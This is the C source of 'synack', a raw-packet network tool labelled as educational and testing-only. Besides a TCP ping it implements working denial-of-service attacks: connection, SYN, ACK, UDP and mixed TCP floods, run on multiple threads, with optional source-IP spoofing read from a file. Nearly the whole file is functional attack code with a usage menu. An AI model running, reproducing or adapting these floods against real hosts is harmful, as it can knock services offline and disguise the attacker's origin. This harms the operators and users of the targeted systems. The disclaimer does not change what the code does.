/* Created by edubart FOR EDUCATIONAL AND TESTING purposes only.
 * Project page https://github.com/edubart/synack
 */

#include "leef.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>

#define TCP_PING   0
#define CONN_FLOOD 1
#define SYN_FLOOD  2
#define ACK_FLOOD  3
#define UDP_FLOOD  4
#define MIX_FLOOD  5
#define MIX2_FLOOD 6

#define MAX(a,b) (a > b ? a : b)
#define MIN(a,b) (a < b ? a : b)

/* global variables */
int running = 1;
uint32_t interface_addr = 0;
const char *interface = NULL;
const char *hostname = NULL;
uint32_t dest_addr = 0;
uint16_t dest_port = 0;
uint32_t sleep_interval = 10000;
uint16_t action_uuid = 0;
uint32_t run_time = 0;
int action = TCP_PING;
int num_threads = 1;
uint32_t *spoof_addresses = NULL;
uint32_t spoof_addresses_size = 0;
uint8_t *send_data = NULL;
int send_data_size = 0;
int quiet = 0;
int use_tcp_options = 0;


/* handle term signals */
void signal_handler(int sig) {
    running = 0;
}

/* spoofing utilities */
uint32_t get_src_ip()
{
    if(spoof_addresses_size > 0) {
        int id;
        if(spoof_addresses_size > 1)
            id = leef_random_range(0, spoof_addresses_size-1);
        else
            id = 0;
        return spoof_addresses[id];
    }
    return interface_addr;
}

/* Connection flood */
void *conn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;

    while(running && (run_time <= 0 || leef_get_ticks() < run_time)) {
        if(++src_port <= 1024)
            src_port = 1025;
        id = leef_random_byte() << 8 | leef_random_byte();
        seq = action_uuid << 16 | id;
        leef_send_tcp_syn(&leef,
                          interface_addr, dest_addr,
                          src_port, dest_port,
                          id, seq,
                          use_tcp_options);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

void conn_flood_sniff_thread()
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return;
    leef_set_sniff_packet_size(&leef, 64);

    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack_seq;
    uint32_t lastTicks;
    uint32_t ticksNow;
    int syn_sent = 0;
    int synack_received = 0;
    int rst_received = 0;
    int fin_received = 0;
    int alive_connections = 0;
    int new_connections = 0;
    int tx_bytes = 0;
    long long total_syn_sent = 0;
    long long total_synack_received = 0;
    long long total_rst_received = 0;
    long long total_fin_received = 0;
    long long total_new_connections = 0;
    long long total_tx_bytes = 0;
    struct leef_sniffed_packet packet;
    int conn_ports[65536];

    memset(conn_ports, 0, sizeof(conn_ports));

    lastTicks = leef_get_ticks();

    while(1) {
        ticksNow = leef_get_ticks();

        /* outputs attack information */
        if(ticksNow - lastTicks >= 1000) {
            total_syn_sent += syn_sent;
            total_synack_received += synack_received;
            total_rst_received += rst_received;
            total_fin_received += fin_received;
            total_new_connections += new_connections;
            total_tx_bytes += tx_bytes;

            if(!running || (run_time > 0 && ticksNow >= run_time))
                break;

            if(!quiet) printf("SYN=%d/s SA=%d/s RA=%d/s FA=%d/s NEW=%d/s FAIL=%d/s ALIVE=%d TX=%.02f Kbps\n",
                   syn_sent,
                   synack_received,
                   rst_received,
                   fin_received,
                   new_connections,
                   MAX(syn_sent - new_connections, 0),
                   alive_connections,
                   (tx_bytes * 8)/1000.0f);
            fflush(stdout);

            synack_received = 0;
            rst_received = 0;
            fin_received = 0;
            syn_sent = 0;
            new_connections = 0;
            tx_bytes = 0;
            lastTicks = ticksNow;
        }

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP &&
               packet.ip->saddr == dest_addr &&
               packet.in_ip.tcp->source == dest_port) {
                /* check if the packet was from this running attack instance */
                if(packet.in_ip.tcp->ack == 1 &&
                   action_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                    continue;
                src_port = packet.in_ip.tcp->dest;
                /* SYN+ACK */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                    id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
                    seq = packet.in_ip.tcp->ack_seq;
                    ack_seq = packet.in_ip.tcp->seq + 1;

                    if(send_data_size) {
                        leef_send_raw_tcp2(&leef,
                                           interface_addr, dest_addr,
                                           src_port, dest_port,
                                           id, seq, ack_seq,
                                           TCP_ACK | TCP_PUSH,
                                           send_data_size,
                                           send_data);
                        tx_bytes += 54 + send_data_size;
                    } else {
                        leef_send_tcp_ack(&leef,
                                          interface_addr, dest_addr,
                                          src_port, dest_port,
                                          id, seq, ack_seq);
                        tx_bytes += 54;
                    }

                    synack_received++;
                    if(conn_ports[src_port] == 0) {
                        conn_ports[src_port] = 1;
                        alive_connections++;
                        new_connections++;
                    }
                /* RST */
                } else if(packet.in_ip.tcp->rst == 1) {
                    static int warned = 0;
                    if(!warned && rst_received >= 0) {
                        if(!quiet) printf("host started rejecting connections\n");
                        fflush(stdout);
                        warned = 1;
                    }

                    rst_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* FIN */
                } else if(packet.in_ip.tcp->fin == 1) {
                    static int warned = 0;
                    if(!warned && fin_received == 0) {
                        if(!quiet) printf("host started ending connections, guessed connection timeout: %d secs\n",
                               leef_get_ticks() / 1000);
                        fflush(stdout);
                        warned = 1;
                    }

                    fin_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP &&
                      packet.ip->saddr == interface_addr &&
                      packet.ip->daddr == dest_addr &&
                      packet.in_ip.tcp->dest == dest_port &&
                      packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
                if(action_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                    continue;
                syn_sent++;
                tx_bytes += 54;
                if(conn_ports[packet.in_ip.tcp->source] == 1) {
                    conn_ports[packet.in_ip.tcp->source] = 0;
                    alive_connections--;
                }
            }
        }
    }

    double connections_fail = total_syn_sent > 0 ? ((total_syn_sent-total_new_connections) * 100.0)/(double)total_syn_sent : .0;
    if(!quiet) printf("\n--- %s:%d connection flood statistics ---\n",  hostname, dest_port);
    if(!quiet) printf("%lld SYN sent, %lld ACK sent\n"
           "%lld SA received, %lld RA received, %lld FA received\n"
           "%lld connection made, %lld connections failed, %.02f%% connections failed\n"
           "%d connections still alive\n"
           "%lld packets sent, %.02f MB sent\n",
            total_syn_sent, total_synack_received,
            total_synack_received, total_rst_received, total_fin_received,
            total_new_connections, total_syn_sent - total_new_connections, connections_fail,
            alive_connections,
            total_syn_sent+total_synack_received, total_tx_bytes/1000000.0);

    leef_terminate(&leef);
}

/* calculate interface TX */
void interface_tx_thread()
{
    uint32_t lastTicks = leef_get_ticks();
    uint32_t ticksNow;
    int64_t lastTxPackets = leef_if_tx_packets(interface);
    int64_t txPackets;
    int64_t lastTxBytes = leef_if_tx_bytes(interface);
    int64_t txBytes;
    int64_t initialTxPackets = lastTxPackets;
    int64_t initialTxBytes = lastTxBytes;

    while(1) {
        ticksNow = leef_get_ticks();
        if(!running || (run_time > 0 && ticksNow >= run_time))
            break;
        if(ticksNow - lastTicks >= 1000) {
            txPackets = leef_if_tx_packets(interface);
            txBytes = leef_if_tx_bytes(interface);
            if(!quiet) printf("%s TX: %d pkt/s, %.02f Mbps\n",
                   interface,
                   (int)(txPackets - lastTxPackets),
                   ((txBytes - lastTxBytes)*8)/1000000.0);
            fflush(stdout);
            lastTicks = ticksNow;
            lastTxPackets = txPackets;
            lastTxBytes = txBytes;
        }
    }

    /* print stastistics */
    if(!quiet) printf("\n--- %s TX statistics ---\n", interface);
    if(!quiet) printf("%lld packets sent, %.02f MB sent\n",
           (long long)(leef_if_tx_packets(interface) - initialTxPackets),
           (double)(leef_if_tx_bytes(interface) - initialTxBytes)/1000000.0);
}

/* SYN flood */
void *syn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        leef_send_tcp_syn(&leef,
                          get_src_ip(), dest_addr,
                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                          leef_random_u16(), leef_random_u32(),
                          use_tcp_options);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* ACK flood */
void *ack_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        leef_send_tcp_ack(&leef,
                          get_src_ip(), dest_addr,
                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                          leef_random_u16(), leef_random_u32(), leef_random_u32());
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* UDP flood */
void *udp_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t data[2];
    uint8_t data_size = 8;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        data[0] = leef_random_u32();
        data[1] = leef_random_u32();
        leef_send_udp_data(&leef,
                           get_src_ip(), dest_addr,
                           leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                           leef_random_u16(),
                           data_size, (uint8_t*)data);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* MIX flood */
void *mix_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t data[2];
    uint8_t data_size;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        switch(rand() % 4) {
            case 0: /* SYN */
                leef_send_tcp_syn(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), action_uuid << 16 | leef_random_u16(),
                                use_tcp_options);
                break;
            case 1: /* ACK */
                leef_send_tcp_ack(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32());
                break;
            case 2: /* PUSH + ACK */
                data_size = (leef_random_byte() % 8) + 1;
                data[0] = leef_random_u32();
                data[1] = leef_random_u32();
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_PUSH | TCP_ACK,
                                data_size, (uint8_t *)data);
            case 3: /* FIN + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_FIN | TCP_ACK,
                                0, NULL);
                break;
        }
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* MIX2 flood */
void *mix2_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t data[2];
    uint8_t data_size;

    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
        switch(rand() % 3) {
            case 0: /* ACK */
                leef_send_tcp_ack(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32());
                break;
            case 1: /* PUSH + ACK */
                data_size = (leef_random_byte() % 8) + 1;
                data[0] = leef_random_u32();
                data[1] = leef_random_u32();
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_PUSH | TCP_ACK,
                                data_size, (uint8_t *)data);
            case 2: /* FIN + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_FIN | TCP_ACK,
                                0, NULL);
                break;
        }
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* TCP ping */
void tcp_ping_thread()
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return;
    leef_set_sniff_packet_size(&leef, 128);

    struct leef_sniffed_packet packet;
    uint16_t src_port = leef_random_range(1025,65535);
    uint32_t ping_ports[65536];
    uint32_t lastTicks;
    uint32_t ticksNow;
    memset(ping_ports, 0, sizeof(ping_ports));
    int sent = 0;
    int received = 0;
    unsigned long rtt_sum = 0;
    int rtt;
    int min_rtt = 9999999;
    int max_rtt = -1;
    int stopping = 0;

    lastTicks = leef_get_ticks();

    while(1) {
        ticksNow = leef_get_ticks();
        if((!running  || (run_time > 0 && ticksNow >= run_time)) && !stopping) {
            stopping = 1;
            lastTicks = ticksNow;
        }

        /* outputs attack information */
        if(!stopping && ticksNow - lastTicks >= 1000) {
            lastTicks = ticksNow;

            /* send a SYN ping */
            if(++src_port <= 1024)
                src_port = 1025;

            leef_send_tcp_syn(&leef,
                              interface_addr, dest_addr,
                              src_port, dest_port,
                              leef_random_u16(), action_uuid << 16 | leef_random_u16(),
                              use_tcp_options);
            sent++;
            ping_ports[src_port] = ticksNow;
        /* wait 1 sec before stopping */
        } else if(stopping && leef_get_ticks() - lastTicks >= 500)
            break;

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP &&
               packet.ip->saddr == dest_addr &&
               packet.in_ip.tcp->source == dest_port &&
               action_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
                /* got a ping reply */
                if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                    rtt = (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]);
                    if(!quiet) printf("port=%d flags=%s ttl=%d size=%d rrt=%d ms\n",
                           dest_port,
                           leef_name_tcp_flags(&packet),
                           packet.ip->ttl,
                           packet.ip->tot_len,
                           rtt);
                    ping_ports[packet.in_ip.tcp->dest] = 0;
                    received++;
                    rtt_sum += rtt;
                    min_rtt = MIN(rtt, min_rtt);
                    max_rtt = MAX(rtt, max_rtt);
                } else {
                    if(!quiet) printf("DUP! port=%d flags=%s ttl=%d size=%d\n",
                           dest_port,
                           leef_name_tcp_flags(&packet),
                           packet.ip->ttl,
                           packet.ip->tot_len);
                }
            }
        }
    }

    /* print stastistics */
    if(!quiet) printf("\n--- %s:%d ping statistics ---\n", hostname, dest_port);
    if(!quiet) printf("%d packets sent, %d packets received, %.02f%% packet loss\n",
           sent,
           received,
           sent > 0 ? ((sent - received)*100.0f)/(float)sent : .0f);
    if(received > 0) {
        if(!quiet) printf("rtt min/avr/max = %d/%d/%d ms\n",
               min_rtt,
               (int)(rtt_sum/received),
               max_rtt);
    }

    leef_terminate(&leef);
}

void print_help(char **argv)
{
    printf("Usage: %s -i <interface> -h <host> [action] [options]\n", argv[0]);
    printf("Actions:\n");
    printf("  -P                - TCP ping (default action)\n");
    printf("  -C                - Connection flood\n");
    printf("  -S                - SYN flood\n");
    printf("  -A                - ACK flood\n");
    printf("  -M                - Mixed S/A/PA/FA flood\n");
    printf("  -N                - Mixed A/PA/FA flood\n");
    printf("  -U                - UDP flood\n");
    printf("General options:\n");
    printf("  -i [interface]    - Which interface to do the action (required)\n");
    printf("  -h [host]         - Target host (required)\n");
    printf("  -p [port]         - Target port (default: random)\n");
    printf("  -t [time]         - Run time in seconds (default: infinite)\n");
    printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
    printf("  -s [ip]           - Use a custom source address\n");
    printf("  -q                - Quiet, don't print statistics output\n");
    printf("  -o                - Enable tcp options on SYN packets\n");
    printf("  --help            - Print this help\n");
    printf("Connection flood options:\n");
    printf("  -d [binary file]  - Send binary file as data\n");
    printf("SYN/ACK/UDP flood options:\n");
    printf("  -m [threads]      - Number of send threads (default: 1)\n");
    printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
}

int main(int argc, char **argv)
{
    /* catch signals */
    signal(SIGTERM, &signal_handler);
    signal(SIGINT, &signal_handler);

    if(argc == 1) {
        print_help(argv);
        return 0;
    }

    /* generate attack uuid */
    static struct timeval tv;
    gettimeofday(&tv, 0);
    action_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;

    /* handle options */
    int arg;
    const char *opt;
    for(arg=1;arg<argc;arg++) {
        opt = argv[arg];
        if(opt && opt[0] == '-' && strlen(opt) == 2) {
            switch(opt[1]) {
                case 'C':
                    action = CONN_FLOOD;
                    break;
                case 'S':
                    action = SYN_FLOOD;
                    break;
                case 'A':
                    action = ACK_FLOOD;
                    break;
                case 'P':
                    action = TCP_PING;
                    break;
                case 'M':
                    action = MIX_FLOOD;
                    break;
                case 'N':
                    action = MIX2_FLOOD;
                    break;
                case 'U':
                    action = UDP_FLOOD;
                    break;
                case 'i':
                    interface = argv[++arg];
                    interface_addr = leef_if_ipv4(interface);
                    if(interface_addr == 0) {
                        fprintf(stderr, "could not read interface ipv4 address\n");
                        return -1;
                    }
                    break;
                case 'h':
                    hostname = argv[++arg];
                    dest_addr = leef_resolve_hostname(hostname);
                    if(dest_addr == 0) {
                        fprintf(stderr, "could not resolve hostname address\n");
                        return -1;
                    }
                    break;
                case 'p':
                    dest_port = atoi(argv[++arg]);
                    break;
                case 'm':
                    num_threads = atoi(argv[++arg]);
                    if(num_threads == 0) {
                        fprintf(stderr, "use at least 1 thread\n");
                        return -1;
                    }
                    break;
                case 's':
                    interface_addr = leef_resolve_hostname(argv[++arg]);
                    if(interface_addr == 0) {
                        fprintf(stderr, "could not resolve source address\n");
                        return -1;
                    }
                    break;
                case 'u':
                    sleep_interval = atoi(argv[++arg]);
                    break;
                case 'q':
                    quiet = 1;
                    break;
                case 'f': {
                    FILE *fp = fopen(argv[++arg], "r");
                    if(fp) {
                        char ip[32];
                        int ch;

                        printf("reading spoofed ip addresses...\n");
                        fflush(stdout);

                        spoof_addresses_size = 0;

                        fseek(fp, 0, SEEK_SET);
                        while((ch = fgetc(fp)) != EOF)
                            if(ch == '\n')
                                spoof_addresses_size++;

                        spoof_addresses = (uint32_t *)malloc(spoof_addresses_size * 4);

                        fseek(fp, 0, SEEK_SET);

                        ch = 0;
                        while(!feof(fp)) {
                            fgets(ip, 32, fp);
                            char *c;
                            while((c = strchr(ip, '\n')) ||
                                  (c = strchr(ip, '\r')) ||
                                  (c = strchr(ip, ' ')))
                                c[0] = 0;
                            uint32_t addr = leef_string_to_addr(ip);
                            if(addr != 0)
                                spoof_addresses[ch++] = addr;
                        }
                        fclose(fp);

                        spoof_addresses_size = ch;

                        printf("done, read %d ips\n", spoof_addresses_size);
                    } else {
                        fprintf(stderr, "failed opening spoofing IPs text file!\n");
                        return -1;
                    }
                    break;
                }
                case 't':
                    run_time = (uint32_t)(atoi(argv[++arg]))*1000;
                    break;
                case 'd': {
                    FILE *fp = fopen(argv[++arg], "rb");
                    if(fp) {
                        fseek(fp, 0, SEEK_END);
                        send_data_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        send_data = (uint8_t *) malloc(send_data_size);
                        fread(send_data, send_data_size, 1, fp);
                        fclose(fp);
                    } else {
                        fprintf(stderr, "could not find data binary file %s\n", argv[arg]);
                        return -1;
                    }
                    break;
                }
                case 'o':
                    use_tcp_options = 1;
                    break;
                default:
                    fprintf(stderr, "incorrect option %s, see --help\n", opt);
                    return -1;
            }
        } else if(strncmp(opt, "--help", 6) == 0) {
            print_help(argv);
            return 0;
        } else {
            fprintf(stderr, "incorrect option %s, see --help\n", opt);
            return -1;
        }
    }

    if(dest_addr == 0) {
        fprintf(stderr, "please specify a target host, see --help\n");
        return -1;
    }

    if(interface == NULL) {
        fprintf(stderr, "please specify which interface that this action runs on\n");
        return -1;
    }

    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
    int i;

    /* force first tick */
    leef_get_ticks();

    /* run the action */
    switch(action) {
        case TCP_PING:
            if(dest_port == 0) {
                fprintf(stderr, "you must specify a target port for this action!\n");
                return -1;
            }
            if(!quiet) printf("TCP PING %s:%d\n", hostname, dest_port);
            tcp_ping_thread();
            num_threads = 0;
            break;
        case CONN_FLOOD:
            if(dest_port == 0) {
                fprintf(stderr, "you must specify a target port for this action!\n");
                return -1;
            }

            if(!quiet) printf("CONNECTION FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
            conn_flood_sniff_thread();
            break;
        case SYN_FLOOD:
            if(!quiet) printf("SYN FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
        case ACK_FLOOD:
            if(!quiet) printf("ACK FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
        case UDP_FLOOD:
            if(!quiet) printf("UDP FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, udp_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
        case MIX_FLOOD:
            if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, mix_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
        case MIX2_FLOOD:
            if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, mix2_flood_attack_thread, NULL);
            interface_tx_thread();
            break;
    }

    /* wait threads */
    for(i=0;i<num_threads;++i)
        pthread_join(threads[i], NULL);

    /* cleanup */
    if(spoof_addresses)
        free(spoof_addresses);

    return 0;
}

